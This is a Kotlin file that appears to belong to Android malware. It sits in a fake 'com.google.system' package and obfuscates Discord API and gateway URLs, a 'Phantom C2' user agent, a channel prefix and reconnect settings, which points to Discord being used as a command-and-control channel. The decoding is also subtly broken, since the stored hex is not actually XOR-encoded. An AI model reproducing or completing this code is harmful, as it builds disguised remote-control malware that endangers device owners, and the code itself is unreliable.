package com.google.system

object StringObfuscator {

    private fun xorDecode(encoded: String, key: Int): String {
        return encoded.chunked(2).map { chunk ->
            val byte = chunk.toInt(16) xor key
            byte.toChar()
        }.joinToString("")
    }

    private fun base64XorDecode(encoded: String, key: Int): String {
        val decoded = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP)
        return decoded.map { (it.toInt() xor key).toChar() }.joinToString("")
    }

    fun get(key: String): String {
        return when (key) {
            "discord_api" -> xorDecode("68747470733a2f2f646973636f72642e636f6d2f6170692f763130", 0x42)
            "gateway_url" -> xorDecode("7773733a2f2f676174657761792e646973636f72642e67672f3f763d313026656e636f64696e673d6a736f6e", 0x42)
            "user_agent" -> base64XorDecode("TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBQaGFudG9tIEMyKQ==", 0x37)
            "channel_prefix" -> xorDecode("7068616e746f6d2d", 0x42)
            "heartbeat_interval" -> "45000"
            "reconnect_base_delay" -> "2000"
            "max_reconnect_delay" -> "300000"
            else -> key
        }
    }

    fun encode(plaintext: String, key: Int = 0x42): String {
        return plaintext.map { char ->
            String.format("%02x", char.code xor key)
        }.joinToString("")
    }
}
